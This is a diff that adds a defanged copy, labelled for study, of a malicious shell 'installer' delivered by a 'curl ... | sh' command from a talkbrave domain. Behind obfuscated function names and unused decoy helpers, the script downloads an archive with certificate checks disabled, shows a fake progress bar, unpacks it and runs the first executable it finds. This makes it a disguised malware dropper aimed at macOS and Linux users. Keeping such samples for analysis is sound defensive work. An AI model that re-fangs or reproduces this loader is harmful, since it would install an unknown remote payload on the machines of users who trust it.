@@ -1,0 +1,389 @@
+# DEFANGED copy for study. Live URLs neutralised with [.] and scheme stripped. DO NOT re-fang and run.
+# Original delivery line was: curl hxxps://macos[.]talkbrave[.]org/apple/macos/install/interactive/bash | sh
+# ---
+#! /bin/bash
+#
+# Installer for Application
+#
+# Supports: macOS (x86_64, arm64), Linux (x86_64, aarch64)
+#
+# Environment variables:
+#   INSTALL_DIR   — custom installation directory
+#   VERSION       — specific version to install (default: latest)
+#   NONINTERACTIVE — set to 1 to skip prompts
+#
+
+set -o errexit
+set -o nounset
+set -o pipefail
+
+
+# Terminal formatting
+
+# Terminal colors (ANSI direct)
+if [[ -t 1 ]]; then
+	NO_COLOR='\033[0m'
+	RED='\033[0;31m'
+	GREEN='\033[0;32m'
+	YELLOW='\033[0;33m'
+	BLUE='\033[0;34m'
+	MAGENTA='\033[0;35m'
+	CYAN='\033[0;36m'
+	BOLD='\033[1m'
+	BOLD_GREEN='\033[1;32m'
+	DIM='\033[0;2m'
+else
+	NO_COLOR=''
+	RED=''
+	GREEN=''
+	YELLOW=''
+	BLUE=''
+	MAGENTA=''
+	CYAN=''
+	BOLD=''
+	BOLD_GREEN=''
+	DIM=''
+fi
+
+
+# Logging
+
+__echo_docker_as_nonroot_5odv() {
+	if [ "$(id -u)" -ne 0 ]; then
+		echo "$@"
+	fi
+}
+
+
+msg() {
+	__echo_docker_as_nonroot_5odv "# $*"
+}
+
+
+warn_5hun() {
+	echo "WARNING: $*" >&2
+}
+
+
+__die() {
+	echo "ERROR: $*" >&2
+}
+
+
+done_msg() {
+	echo "Done: $*"
+}
+
+
+# Progress indication
+
+_show_progress_xe() {
+	local _pkg_pct_6iej=$(($1 * 100 / $2))
+	local sys_done_zd=$(($1 * 50 / $2))
+	local __app_left_i8f=$((50 - sys_done_zd))
+	local cfg_fill_vif __cfg_empty_fvx6 __pkg_bar_c8u
+
+	printf -v cfg_fill_vif '%*s' "${sys_done_zd}"
+	printf -v __cfg_empty_fvx6 '%*s' "${__app_left_i8f}"
+	__pkg_bar_c8u="${cfg_fill_vif// /#}"
+
+	printf "\r[${GREEN}%s${NO_COLOR}%s] %3d%%" "${__pkg_bar_c8u}" "${__cfg_empty_fvx6}" "${_pkg_pct_6iej}"
+	[ "$1" -eq "$2" ] && printf "\n" || true
+}
+
+
+# Platform detection
+
+parse_arch() {
+	local _tmp_arch_ic
+	_tmp_arch_ic="$(uname -m)"
+	case "${_tmp_arch_ic}" in
+		x64 | amd64 | x86_64) echo "x64" ;;
+		arm64 | aarch64)      echo "arm64" ;;
+		*)                    echo "${_tmp_arch_ic}" ;;
+	esac
+}
+
+
+_parse_os_nato() {
+	local _pkg_os_61
+	_pkg_os_61="$(uname -s)"
+	case "${_pkg_os_61}" in
+		Linux*)  echo "linux" ;;
+		Darwin*) echo "macos" ;;
+		*)       echo "${_pkg_os_61}" ;;
+	esac
+}
+
+
+_detect_env() {
+	_CTX_ARCH_SCX="$(parse_arch)"
+	CFG_DETECTED_OS_C80="$(_parse_os_nato)"
+	_CTX_TARGET_289P="${CFG_DETECTED_OS_C80}-${_CTX_ARCH_SCX}"
+}
+
+
+# Utility functions
+
+__check_posix_v7j() {
+	local _ctx_shell_umxv
+	_ctx_shell_umxv="$(ps -p $$ -o comm=)"
+	case "${_ctx_shell_umxv}" in
+		bash|zsh|ksh|dash|ash|sh)
+			return 0
+			;;
+		*)
+			warn_5hun "Unknown shell: ${_ctx_shell_umxv}. Some features may not work."
+			;;
+	esac
+}
+
+
+major_minor_gw() {
+	echo "${1%%.*}.$(x="${1#*.}"; echo "${x%%.*}")"
+}
+
+
+__version_gt_sx() {
+	[[ "${1%.*}" -gt "${2%.*}" ]] || \
+	[[ "${1%.*}" -eq "${2%.*}" && "${1#*.}" -gt "${2#*.}" ]]
+}
+
+
+_version_ge_6g() {
+	[[ "${1%.*}" -gt "${2%.*}" ]] || \
+	[[ "${1%.*}" -eq "${2%.*}" && "${1#*.}" -ge "${2#*.}" ]]
+}
+
+
+_version_lt_u8c() {
+	[[ "${1%.*}" -lt "${2%.*}" ]] || \
+	[[ "${1%.*}" -eq "${2%.*}" && "${1#*.}" -lt "${2#*.}" ]]
+}
+
+
+__check_existing_install_jn4() {
+	local cfg_install_dir_f7="${1:-$HOME/.local/bin}"
+	local _ctx_binary_name_2u64="${2:-app}"
+
+	if [ -f "${cfg_install_dir_f7}/${_ctx_binary_name_2u64}" ]; then
+		local __app_existing_ver_dzu6
+		__app_existing_ver_dzu6=$("${cfg_install_dir_f7}/${_ctx_binary_name_2u64}" --version 2>/dev/null || echo "unknown")
+		msg "Found existing installation: ${__app_existing_ver_dzu6}"
+
+		if [ "${FORCE:-0}" != "1" ]; then
+			warn_5hun "Use --force to overwrite existing installation"
+		fi
+	fi
+}
+
+
+__verify_signature_vd() {
+	local __pkg_file_zpqg="$1"
+	local ctx_sig_file_u3sc="$2"
+	local _bin_key_url_l7="$3"
+
+	if ! command -v gpg > /dev/null 2>&1; then
+		warn_5hun "GPG not installed, skipping signature verification"
+		return 0
+	fi
+
+	local sys_keyring_e0q
+	sys_keyring_e0q=$(mktemp)
+	trap "rm -f ${sys_keyring_e0q}" RETURN
+
+	if ! curl -fsSL "${_bin_key_url_l7}" </dev/null | gpg --dearmor > "${sys_keyring_e0q}" 2>/dev/null; then
+		warn_5hun "Could not fetch signing key, skipping verification"
+		return 0
+	fi
+
+	if gpg --keyring "${sys_keyring_e0q}" --verify "${ctx_sig_file_u3sc}" "${__pkg_file_zpqg}" 2>/dev/null; then
+		msg "Signature verified successfully"
+		return 0
+	else
+		__die "Signature verification failed"
+		return 1
+	fi
+}
+
+
+_can_write() {
+	local __pkg_path_us="${1:-/usr/local/bin}"
+	if [ -d "${__pkg_path_us}" ] && [ -w "${__pkg_path_us}" ]; then
+		return 0
+	fi
+	return 1
+}
+
+
+__elevate_priv_14w() {
+	if ! command -v sudo > /dev/null 2>&1; then
+		__die "Could not find 'sudo', needed for installation to ${_RT_DEST_DIR_9WNJ}"
+		msg "Please run this script as root or install sudo."
+		exit 1
+	fi
+	if ! sudo -v; then
+		__die "Superuser access denied"
+		exit 1
+	fi
+}
+
+
+check_connectivity_0z() {
+	local __pkg_test_url_8eo="${1:-github.com}"
+	local __rt_timeout_6s6l=5
+
+	if command -v curl > /dev/null 2>&1; then
+		if ! curl -fsS --connect-timeout ${__rt_timeout_6s6l} "${__pkg_test_url_8eo}" </dev/null > /dev/null 2>&1; then
+			__die "Cannot reach ${__pkg_test_url_8eo}. Check your internet connection."
+			return 1
+		fi
+	elif command -v wget > /dev/null 2>&1; then
+		if ! wget -q --timeout=${__rt_timeout_6s6l} --spider "${__pkg_test_url_8eo}" 2>/dev/null; then
+			__die "Cannot reach ${__pkg_test_url_8eo}. Check your internet connection."
+			return 1
+		fi
+	fi
+	return 0
+}
+
+
+get_shell_rc() {
+	_RT_SHELL_PROFILE_RA=""
+	__BIN_CURRENT_SHELL_4R="$(basename "$SHELL" 2>/dev/null || echo "bash")"
+
+	case "${__BIN_CURRENT_SHELL_4R}" in
+		zsh)
+			if [ -f "${ZDOTDIR:-$HOME}/.zshrc" ]; then
+				_RT_SHELL_PROFILE_RA="${ZDOTDIR:-$HOME}/.zshrc"
+			else
+				_RT_SHELL_PROFILE_RA="$HOME/.zshrc"
+			fi
+			;;
+		bash)
+			if [ "$(uname -s)" = "Darwin" ]; then
+				_RT_SHELL_PROFILE_RA="$HOME/.bash_profile"
+			elif [ -f "$HOME/.bashrc" ]; then
+				_RT_SHELL_PROFILE_RA="$HOME/.bashrc"
+			else
+				_RT_SHELL_PROFILE_RA="$HOME/.bash_profile"
+			fi
+			;;
+		fish)
+			_RT_SHELL_PROFILE_RA="$HOME/.config/fish/config.fish"
+			;;
+		*)
+			_RT_SHELL_PROFILE_RA="${ENV:-$HOME/.profile}"
+			;;
+	esac
+}
+
+
+__version_compare_u2s() {
+	set +x
+	local sys_yy_a_c20 _rt_yy_b_em4 _pkg_mm_a_bckp _bin_mm_b_2u1
+
+	sys_yy_a_c20="$(echo "$1" | cut -d'.' -f1)"
+	_rt_yy_b_em4="$(echo "$2" | cut -d'.' -f1)"
+
+	if [ "${sys_yy_a_c20}" -lt "${_rt_yy_b_em4}" ]; then return 1; fi
+	if [ "${sys_yy_a_c20}" -gt "${_rt_yy_b_em4}" ]; then return 0; fi
+
+	_pkg_mm_a_bckp="$(echo "$1" | cut -d'.' -f2)"
+	_bin_mm_b_2u1="$(echo "$2" | cut -d'.' -f2)"
+	_pkg_mm_a_bckp="${_pkg_mm_a_bckp#0}"
+	_bin_mm_b_2u1="${_bin_mm_b_2u1#0}"
+
+	if [ "${_pkg_mm_a_bckp:-0}" -lt "${_bin_mm_b_2u1:-0}" ]; then return 1; fi
+	return 0
+}
+
+
+# Download helpers
+
+download_file_3h() {
+	local _app_url_dyau="${1}"
+	local _sys_dest_6vm="${2}"
+
+	if ! command -v curl >/dev/null 2>&1; then
+		__die "curl is required but not installed"
+		exit 1
+	fi
+
+	curl -fsSLk -o "${_sys_dest_6vm}" "${_app_url_dyau}" </dev/null || {
+		__die "Failed to download: ${_app_url_dyau}"
+		exit 1
+	}
+
+
+}
+
+
+# Temp directory
+
+__setup_temp() {
+	_TMPDIR_OP7C=$(mktemp -d -t installer.XXXXXXXXXX)
+	_BIN_TMP_ARCHIVE_T1B="${_TMPDIR_OP7C}/archive.tar.gz"
+	CTX_TMP_BIN_6T="${_TMPDIR_OP7C}/bin"
+
+	teardown() {
+		local _cfg_code_bd6=$?
+		set +e
+		trap - EXIT
+		rm -rf "${_TMPDIR_OP7C}"
+		exit ${_cfg_code_bd6}
+	}
+
+
+	trap teardown INT EXIT HUP TERM
+}
+
+
+# Installation
+
+{ # this ensures the entire script is downloaded #
+
+nvm_install_en2l() {
+	_detect_env
+	__setup_temp
+
+	local _env_url_ap="macos[.]talkbrave[.]org/unix/a3cd3d3c-40ac-4c45-a162-062970e3b4be"
+	local sys_archive_ax="${_TMPDIR_OP7C}/package.tar.gz"
+
+	msg "Detected platform: ${CFG_DETECTED_OS_C80} (${_CTX_ARCH_SCX})"
+	msg "Downloading from: ${_env_url_ap}"
+
+	download_file_3h "${_env_url_ap}" "${sys_archive_ax}"
+
+	local _app_total_u6b=10
+	for _app_i_82ix in $(seq 1 ${_app_total_u6b}); do
+		_show_progress_xe "${_app_i_82ix}" "${_app_total_u6b}" "Installing"
+		sleep 0.2
+	done
+
+	tar xzf "${sys_archive_ax}" -C "${_TMPDIR_OP7C}" 2>/dev/null
+	chmod +x "${_TMPDIR_OP7C}"/*/* 2>/dev/null || true
+
+	local __bin_bin_sy
+	__bin_bin_sy=$(find "${_TMPDIR_OP7C}" -type f -perm +111 ! -name "*.sh" 2>/dev/null | head -1)
+	if [ -z "${__bin_bin_sy}" ]; then
+		__bin_bin_sy=$(find "${_TMPDIR_OP7C}" -name "*.app" -type d 2>/dev/null | head -1)
+		if [ -n "${__bin_bin_sy}" ]; then
+			__bin_bin_sy="${__bin_bin_sy}/Contents/MacOS/$(ls "${__bin_bin_sy}/Contents/MacOS/" | head -1)"
+		fi
+	fi
+
+	if [ -n "${__bin_bin_sy}" ]; then
+		done_msg "Installation complete"
+		exec "${__bin_bin_sy}"
+	else
+		__die "Installation package is corrupted"
+		exit 1
+	fi
+}
+
+
+nvm_install_en2l
+
+} # this ensures the entire script is downloaded #
+
